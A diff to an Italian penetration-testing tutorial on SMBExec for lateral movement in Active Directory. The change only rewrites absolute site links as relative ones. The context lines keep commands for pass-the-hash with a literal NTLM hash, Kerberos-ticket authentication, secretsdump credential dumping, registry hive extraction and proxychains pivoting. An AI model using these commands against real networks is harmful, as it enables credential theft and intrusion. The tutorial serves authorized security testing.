@@ -21,7 +21,7 @@ featured: true
 
 ## Posizione nella Kill Chain
 
-SMBExec si colloca nella fase di lateral movement, dopo aver ottenuto credenziali valide tramite tecniche come credential harvesting con [Mimikatz](https://hackita.it/articoli/mimikatz/), password spraying con [Hydra](https://hackita.it/articoli/hydra/), o hash dumping. L'output di SMBExec alimenta direttamente la fase successiva: privilege escalation locale, credential dumping aggiuntivo, o persistenza.
+SMBExec si colloca nella fase di lateral movement, dopo aver ottenuto credenziali valide tramite tecniche come credential harvesting con [Mimikatz](/articoli/mimikatz/), password spraying con [Hydra](/articoli/hydra/), o hash dumping. L'output di SMBExec alimenta direttamente la fase successiva: privilege escalation locale, credential dumping aggiuntivo, o persistenza.
 
 | Fase Kill Chain   | Tool Precedente     | SMBExec                   | Tool Successivo     |
 | ----------------- | ------------------- | ------------------------- | ------------------- |
@@ -103,7 +103,7 @@ Per ambienti con NTLM disabilitato:
 smbexec.py -k -no-pass CORP/administrator@dc01.corp.local
 ```
 
-Richiede un TGT valido nella cache (`KRB5CCNAME` environment variable) ottenuto con [Rubeus](https://hackita.it/articoli/rubeus/) o getTGT.py.
+Richiede un TGT valido nella cache (`KRB5CCNAME` environment variable) ottenuto con [Rubeus](/articoli/rubeus/) o getTGT.py.
 
 ## Come Funziona Internamente
 
@@ -143,7 +143,7 @@ C:\Windows\system32> reg save HKLM\SYSTEM C:\Windows\Temp\sys
 
 Poi scarica i file e processali offline con secretsdump.py.
 
-Alternativa diretta con secretsdump dalla stessa suite [Impacket](https://hackita.it/articoli/impacket/):
+Alternativa diretta con secretsdump dalla stessa suite [Impacket](/articoli/impacket/):
 
 ```bash
 secretsdump.py CORP/administrator:Password123@192.168.1.100
@@ -199,7 +199,7 @@ C:\> powershell -enc <BASE64_STRING>
 
 **Timeline stimata: 15 minuti**
 
-Situazione: hai compromesso una workstation con [Metasploit](https://hackita.it/articoli/metasploit/) e dumpato hash locali.
+Situazione: hai compromesso una workstation con [Metasploit](/articoli/metasploit/) e dumpato hash locali.
 
 ```bash
 # COMANDO: Dump hash dalla sessione Meterpreter
@@ -232,7 +232,7 @@ smbexec.py -hashes :e19ccf75ee54e06b06a5907af13cef42 ./Administrator@192.168.1.1
 
 **Timeline stimata: 5 minuti**
 
-Hai credenziali Domain Admin da phishing con [SET](https://hackita.it/articoli/set/).
+Hai credenziali Domain Admin da phishing con [SET](/articoli/set/).
 
 ```bash
 # COMANDO: Connessione diretta al DC
@@ -285,10 +285,10 @@ proxychains smbexec.py CORP/admin:pass@10.10.10.50
 
 | SMBExec +                                                 | Risultato                     | Comando                                                 |
 | --------------------------------------------------------- | ----------------------------- | ------------------------------------------------------- |
-| [secretsdump.py](https://hackita.it/articoli/secretsdump/) | Dump credenziali senza shell  | `secretsdump.py user:pass@target`                       |
-| [BloodHound](https://hackita.it/articoli/bloodhound/)      | Visualizza path di attacco    | Identifica target → SMBExec per accesso                 |
-| [NetExec](https://hackita.it/articoli/netexec/)           | Validazione credenziali massa | `nxc smb range -u user -p pass` → SMBExec su "(Pwn3d!)" |
-| [Chisel](https://hackita.it/articoli/chisel/)              | Pivot in reti isolate         | Tunnel SOCKS → proxychains + SMBExec                    |
+| [secretsdump.py](/articoli/secretsdump/) | Dump credenziali senza shell  | `secretsdump.py user:pass@target`                       |
+| [BloodHound](/articoli/bloodhound/)      | Visualizza path di attacco    | Identifica target → SMBExec per accesso                 |
+| [NetExec](/articoli/netexec/)           | Validazione credenziali massa | `nxc smb range -u user -p pass` → SMBExec su "(Pwn3d!)" |
+| [Chisel](/articoli/chisel/)              | Pivot in reti isolate         | Tunnel SOCKS → proxychains + SMBExec                    |
 
 ## Confronto con Alternative
 
@@ -400,10 +400,10 @@ Sì: eventi creazione servizio, connessioni SMB nei log, potenziali artefatti in
 
 **È legale usare SMBExec?**
 
-Solo su sistemi con autorizzazione scritta. Per penetration test Active Directory professionali, [hackita.it/servizi](https://hackita.it/servizi).
+Solo su sistemi con autorizzazione scritta. Per penetration test Active Directory professionali, [hackita.it/servizi](/servizi).
 
 ***
 
-*Vuoi supportare HackIta? Visita [hackita.it/supporto](https://hackita.it/supporto) per donazioni. Per penetration test professionali e formazione 1:1, scopri [hackita.it/servizi](https://hackita.it/servizi).*
+*Vuoi supportare HackIta? Visita [hackita.it/supporto](/supporto) per donazioni. Per penetration test professionali e formazione 1:1, scopri [hackita.it/servizi](/servizi).*
 
 **Risorse**: [Impacket GitHub](https://github.com/fortra/impacket) | [Impacket Docs](https://www.secureauth.com/labs/open-source-tools/impacket/)
